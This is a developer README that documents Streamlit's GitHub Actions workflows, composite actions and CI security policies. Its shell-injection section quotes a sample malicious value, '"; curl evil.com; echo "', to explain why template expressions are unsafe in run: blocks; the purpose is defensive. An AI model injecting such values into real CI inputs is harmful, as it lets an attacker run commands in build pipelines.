# GitHub Actions Workflows

This folder contains all GitHub Actions workflows for the Streamlit repository. Workflows automate CI/CD, testing, releases, and maintenance tasks.

> **Maintenance Note:** Keep this documentation up to date. When adding, removing, or modifying workflows or composite actions, update the relevant sections in this file.

## Workflow Guidelines

### External Actions Policy

**Prefer built-in solutions over external actions.** When adding new automation:

1. **Use existing approved actions**: `actions/*`, `github/*`, `pypa/*`, `astral-sh/setup-uv`, `snowflakedb/reusable-workflows`
2. **Use `actions/github-script`** for GitHub API interactions instead of third-party actions
3. **Use bash/shell scripts** for general automation tasks
4. **Pin action versions** using SHA hashes for security-critical actions (e.g., `pypa/gh-action-pypi-publish@ed0c53...`)

Avoid adding new external actions unless absolutely necessary. This reduces supply chain risk and makes workflows easier to audit.

### Shell Injection Prevention

**Never interpolate `${{ }}` expressions directly in `run:` blocks when the value could originate from user input.** This includes `inputs.*`, `steps.*.outputs.*`, `github.head_ref`, `github.event.*.body`, `github.event.*.title`, and any value derived from PR/issue content, branch names, or commit messages.

Instead, pass dynamic values through step-level `env:` variables:

```yaml
# UNSAFE — value is injected directly into the shell command:
run: |
  git push origin "${{ steps.create-branch.outputs.branch_name }}"

# SAFE — value is passed as an environment variable:
env:
  BRANCH_NAME: ${{ steps.create-branch.outputs.branch_name }}
run: |
  git push origin "$BRANCH_NAME"
```

**Why:** GitHub Actions template expressions (`${{ }}`) are substituted _before_ the shell runs, so a malicious value like `"; curl evil.com; echo "` executes as shell commands. Environment variables are not shell-interpreted during substitution, so they are safe.

**Safe contexts that don't need `env:` indirection:** `${{ }}` in `with:` parameters (parsed by YAML, not shell), `if:` conditions, and `env:` value positions are not vulnerable. GitHub-controlled constants like `github.repository`, `github.run_id`, and `github.sha` are also safe in `run:` blocks since their format is constrained.

### Best Practices

- Use `workflow_call` to create reusable workflows
- Set appropriate `permissions` (principle of least privilege)
- Use `concurrency` to prevent duplicate runs
- Handle fork PRs carefully (limited `GITHUB_TOKEN` permissions)
- Use composite actions in `.github/actions/` for shared setup steps

## Shared Composite Actions

Reusable composite actions in `.github/actions/` encapsulate common setup steps. Use these instead of duplicating logic.

| Action | Description |
|--------|-------------|
| `build_info` | Sets Python version env vars (`PYTHON_MIN_VERSION`, `PYTHON_MAX_VERSION`, `PYTHON_VERSIONS`). Call early in workflows. |
| `make_init` | Full dev environment setup: uv, Python, Node/Yarn, protoc, virtualenv, protobufs. Does NOT install Playwright. |
| `playwright_install` | Installs Playwright browsers with caching (by OS/arch/version). Call after `make_init` for E2E tests. |
| `apt_mirror_fix` | Fixes slow Azure apt mirrors on Ubuntu runners. Called automatically by `playwright_install`. |
| `preview_branch` | Sets `PREVIEW_BRANCH` and `BRANCH` env vars for PR preview deployments. Uses action inputs to mitigate script injection. |

### Typical Usage Pattern

```yaml
steps:
  - uses: actions/checkout@v6
  - uses: ./.github/actions/build_info        # Get Python versions
  - uses: ./.github/actions/make_init         # Setup dev environment
    with:
      python_version: ${{ env.PYTHON_MAX_VERSION }}
  - uses: ./.github/actions/playwright_install  # Only for E2E tests
```

## Workflow Reference

### CI & Testing

| Workflow | Trigger | Description |
|----------|---------|-------------|
| `python-tests.yml` | Push/PR to `develop` | Python unit tests, linting, type checking across all supported Python versions |
| `js-tests.yml` | Push/PR to `develop` | Frontend TypeScript linting, type checking, Knip dependency analysis (PR-blocking), and Vitest unit tests with coverage |
| `js-unit-tests.yml` | `workflow_call` | Reusable JS unit test workflow (called by other workflows) |
| `playwright.yml` | Push/PR to `develop` | Full E2E test suite across webkit, chromium, and firefox |
| `playwright-changed-files.yml` | PR | Runs E2E tests only for changed test files (faster feedback) |
| `playwright-custom-components.yml` | Push/PR to `develop` | E2E tests specifically for custom components |
| `playwright-starlette.yml` | Push to `develop`, labeled PR | E2E tests using experimental Starlette server backend |
| `cli-regression.yml` | Push/PR to `develop` | CLI regression tests (builds package and runs CLI tests) |
| `performance.yml` | Push/PR to `develop` | Performance benchmarks (Playwright, Python, Lighthouse) |
| `component-template-e2e-tests.yml` | Push/PR to `develop` | Tests for the streamlit/component-template repo |
| `python-bare-executions.yml` | Push/PR to `develop` | Bare Python execution tests |
| `flaky-test-verification.yml` | `flaky-verify` label | Runs E2E tests multiple times to verify flakiness fixes |
| `flaky-js-test-verification.yml` | `flaky-verify-js` label | Runs JS unit tests multiple times to verify flakiness fixes |

### Code Quality & Validation

| Workflow | Trigger | Description |
|----------|---------|-------------|
| `enforce-pre-commit.yml` | Push/PR to `develop` | Runs all pre-commit hooks on the codebase |
| `ensure-relative-imports.yml` | Push/PR to `develop` | Validates relative imports in `@streamlit/lib` build output |
| `require-labels.yml` | PR events | Enforces required PR labels (change type, impact) |
| `snapshot-hygiene.yml` | Push/PR (e2e_playwright changes) | Detects orphaned E2E test snapshots |
| `spec-validation.yml` | PR with `change:spec` label | Validates product spec PRs in `specs/` directory |

### Security & Analysis

| Workflow | Trigger | Description |
|----------|---------|-------------|
| `codeql-analysis.yml` | Push/PR to `develop`, weekly | GitHub CodeQL security scanning for JS and Python |
| `semgrep.yml` | PR | Semgrep static analysis via Snowflake reusable workflow |

### Release & Publishing

| Workflow | Trigger | Description |
|----------|---------|-------------|
| `nightly.yml` | Daily schedule (6:30 UTC) | Creates nightly tag, runs full test suite, publishes to PyPI |
| `release.yml` | Manual (on tag) | Builds and publishes official releases to PyPI and GitHub |
| `release-branch-creation.yml` | Manual | Creates release branch from a nightly tag |
| `release-tag-and-pr-creation.yml` | Manual | Creates release tag and PR to merge back to develop |
| `patch-release-branch-creation.yml` | Manual | Creates patch release branch from existing release tag |
| `cherry-pick-to-release-branch.yml` | Manual | Cherry-picks commits to release branches |
| `publish-component-v2-lib.yml` | Manual | Publishes `@streamlit/component-v2-lib` to npm |
| `bump-component-v2-lib.yml` | Manual | Bumps version of component-v2-lib and creates PR |

### PR Automation & Previews

| Workflow | Trigger | Description |
|----------|---------|-------------|
| `pr-preview.yml` | Push/PR to `develop` | Builds wheel, uploads to S3, creates preview deployment |
| `autofix.yml` | `autofix` label on PR | Runs formatters, linters, and other cleanups, then creates fix PR |
| `snapshot-autofix.yml` | `update-snapshots` label | Downloads failed snapshots and creates update PR |
| `fork-pr-welcome.yml` | PR opened from fork | Posts welcome comment with contribution guidelines |
| `stale-prs.yml` | Daily schedule (6:30 UTC), Manual (`workflow_dispatch`) | Stale PR processing for inactivity policy |

### AI-Assisted Workflows

| Workflow | Trigger | Description |
|----------|---------|-------------|
| `ai-pr-review.yml` | `ai-review` label or manual | AI-powered code review using Cursor CLI |
| `ai-issue-triage.yml` | `ai-review` label on issue or manual | AI-powered issue triage (duplicates, labels) |
| `ai-update-docs.yml` | Weekly (Tuesdays) or manual | AI-powered documentation review and updates |
| `ai-fix-flaky-e2e-tests.yml` | Weekly (Fridays) or manual | AI-powered flaky E2E test diagnosis and fixing |

### Maintenance & Updates

| Workflow | Trigger | Description |
|----------|---------|-------------|
| `update-browserslist-db.yml` | Weekly (Tuesdays) | Updates browserslist database, creates PR if changed |
| `update-emojis-material-icons.yml` | Weekly (Tuesdays) | Updates emoji and Material icons assets |
| `community-voting.yml` | Issue labeled | Adds voting comment and reaction to bug/enhancement issues |

### Infrastructure

| Workflow | Trigger | Description |
|----------|---------|-------------|
| `copilot-setup-steps.yml` | Manual, on workflow changes | Setup steps for GitHub Copilot Workspace |
| `static-deploy.yml` | Manual | Deploys static frontend build to S3 |
